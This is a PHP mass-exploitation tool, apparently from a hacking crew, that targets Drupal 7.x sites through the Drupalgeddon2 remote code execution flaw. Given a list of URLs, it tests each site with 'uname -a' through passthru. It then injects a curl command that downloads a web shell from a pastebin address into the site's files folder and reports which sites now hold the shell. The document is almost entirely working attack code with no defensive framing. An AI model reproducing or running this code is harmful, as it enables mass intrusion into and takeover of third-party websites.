<title>AutoExploit RCE Drupal 7.x</title>
  <link href="https://fonts.googleapis.com/css?family=Poor+Story" rel="stylesheet">
<style>
body {
    margin-left: 100px;
    margin-right: 100px;
    font-family: Poor Story;
    }
textarea { 
    border: 2px solid red;
    margin: 4px;
    padding: 4px;
    color: red;
    height: 150px;
    width: 500px;
    font-family: Poor Story;
    }
input[type=submit] { 
    border: 2px solid red;
    background: red;
    margin: 4px;
    padding: 4px;
    color: #fff;
    font-family: Poor Story;
    width: 500px;
    }  
</style>
<center>AutoExploit RCE Drupal 7.x<br>
<form action="" method="post">
<textarea name="url"></textarea><br>
<input type="submit" name="bom" value="EXECUTE">
</form></center>
 <?php
// coded by UstadCage_48
// maap jika codenya acak acakan dan banyak code yg tak berguna
// res7ock crew - 
// alur di tools zerobyte.id
error_reporting(0);
function curl($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$output = curl_exec($ch);
	curl_close($ch);
	return $output;
        }
function sending($sss,$cc){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $sss.'/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=curl+-o+sites/default/files/ustad.php+"https://pastebin.com/raw/vKfyPDA3"');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS,'form_id=user_pass&_triggering_element_name=name');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $ee = curl_exec($ch);
        curl_close($ch);
        return $ee;
        }
function sendingajax($sss,$cc){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $sss.'/?q=file/ajax/name/%23value/'.$cc);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS,'form_build_id='.$cc);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $ee = curl_exec($ch);
        curl_close($ch);
        return $ee;
        }

    $beby = explode("\r\n", $_POST['url']);
    if($_POST['bom']){
    foreach($beby as $aa){
    $url = curl($aa."/?q=user/password&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=uname+-a");
    if(preg_match('/value="form-/', $url)){
    $get = curl($aa."/?q=user/password&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=uname+-a");
    if(preg_match('# type="hidden" name="form_build_id" value="(.*?)"#is', $get, $matches)){
    $ez = $matches[1];
    $send = sending($aa,$ez);
    if(preg_match('# type="hidden" name="form_build_id" value="(.*?)"#is', $send, $matches)){
    $ez1 = $matches[1];
    $send_ajax = sendingajax($aa,$ez1);
    $cekshell=curl("$aa/sites/default/files/ustad.php");
          if(preg_match('/USTADCAGE_48/', $cekshell)){
            echo " 
            [ Drupal ] $aa<br>
            [ Drupal ] <font color=green>Upload Done</font><br>
            [ Drupal ] Shell -> <a href=$aa/sites/default/files/ustad.php>Cek Shell</a><br>
            [ Drupal ] <font color=green>Done ~</font><br>";
            } else { 
            echo "
            [ Drupal ] $aa<br>
            [ Drupal ] <font color=red>Upload Error</font><br>
            [ Drupal ] <font color=red>Done ~</font><br>";
            }

    }
    }
    } else {
           echo "
            [ Drupal ] $aa<br>
            [ Drupal ] <font color=red>Not Vulnerability !</font><br>
            [ Drupal ] <font color=red>Done ~</font><br>";
            } 
       }
         }
?>
